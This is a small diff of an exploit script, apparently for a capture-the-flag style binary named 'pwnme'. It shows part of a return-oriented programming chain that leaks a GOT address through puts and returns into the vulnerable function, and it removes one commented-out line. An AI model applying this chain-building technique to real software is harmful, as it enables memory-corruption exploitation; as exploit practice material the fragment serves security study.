@@ -68,7 +68,6 @@ PL+=p64(got_foothold)  # popped in rdi
 PL+=p64(g_ret)         # alignment
 PL+=p64(puts)          # send it
 PL+=p64(g_poprdi)      # new arg for pwnme
-#PL+=p64(leak+0x48)     # for rdi (address of new address)
 PL+=p64(leak+0x80)     # for rdi (new address)
 PL+=p64(pwnme)         # go back to pwnme
 
